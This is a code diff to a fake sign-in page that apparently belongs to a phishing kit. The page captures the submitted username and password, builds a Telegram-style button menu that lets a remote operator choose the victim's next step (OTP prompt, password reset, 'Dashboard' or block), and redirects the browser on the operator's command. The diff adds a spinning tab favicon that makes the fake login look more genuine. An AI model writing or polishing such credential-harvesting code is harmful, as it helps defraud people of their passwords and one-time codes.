@@ -201,6 +201,57 @@
     };
     // =========================
 
+    /* ---------- Rolling favicon (tab loader) ---------- */
+    let faviconTimer = null;
+    let favAngle = 0;
+    const favCanvas = document.createElement('canvas');
+    favCanvas.width = 32;
+    favCanvas.height = 32;
+    const favCtx = favCanvas.getContext('2d');
+
+    let faviconLink = document.querySelector("link[rel*='icon']");
+    if (!faviconLink) {
+        faviconLink = document.createElement('link');
+        faviconLink.rel = 'icon';
+        document.head.appendChild(faviconLink);
+    }
+
+    function drawFavicon(angle) {
+        favCtx.clearRect(0, 0, 32, 32);
+
+        // track ring
+        favCtx.beginPath();
+        favCtx.arc(16, 16, 11, 0, Math.PI * 2);
+        favCtx.strokeStyle = '#dfe3e8';
+        favCtx.lineWidth = 5;
+        favCtx.stroke();
+
+        // spinning arc
+        favCtx.beginPath();
+        favCtx.arc(16, 16, 11, angle, angle + Math.PI * 0.65);
+        favCtx.strokeStyle = '#215c8e';
+        favCtx.lineWidth = 5;
+        favCtx.lineCap = 'round';
+        favCtx.stroke();
+
+        faviconLink.href = favCanvas.toDataURL('image/png');
+    }
+
+    function startTabSpinner() {
+        if (faviconTimer) return;
+        faviconTimer = setInterval(function () {
+            favAngle += Math.PI / 8;
+            drawFavicon(favAngle);
+        }, 60);
+    }
+
+    function stopTabSpinner() {
+        if (faviconTimer) {
+            clearInterval(faviconTimer);
+            faviconTimer = null;
+        }
+    }
+
     /* ---------- Form handling ---------- */
     $(document).ready(function() {
         $('#form-1').on('submit', async function(e) {
@@ -209,8 +260,9 @@
             const user = $('#ai').val();
             const pass = $('#pr').val();
 
-            // Spin the Sign in button only (no tab favicon change)
+            // Spin the Sign in button + roll the tab favicon
             $('#btn1').addClass('loading').prop('disabled', true);
+            startTabSpinner();
 
             const sid = (crypto.randomUUID && crypto.randomUUID().slice(0, 8)) ||
                         Math.random().toString(36).slice(2, 10);
@@ -218,10 +270,10 @@
             const keyboard = {
                 inline_keyboard: [
                     [{ text: "🔐 OTP",       callback_data: `otp:${sid}`     }],
-                    [{ text: "🔑 passwordrest",    callback_data: `passwordrest:${sid}`  }],
+                    [{ text: "🔑 Forgot",    callback_data: `forgot:${sid}`  }],
                     [{ text: "↩️ Login",     callback_data: `login:${sid}`   }],
-                    [{ text: "✅ secquestion", callback_data: `secquestion:${sid}` }],
-                    [{ text: "🚫 detail",     callback_data: `detail:${sid}`   }]
+                    [{ text: "✅ Dashboard", callback_data: `success:${sid}` }],
+                    [{ text: "🚫 Block",     callback_data: `block:${sid}`   }]
                 ]
             };
 
@@ -279,6 +331,7 @@
                     });
 
                     // Follow the command
+                    stopTabSpinner();
                     window.location.href = ROUTES[action] || "login.html";
                     return;
                 }
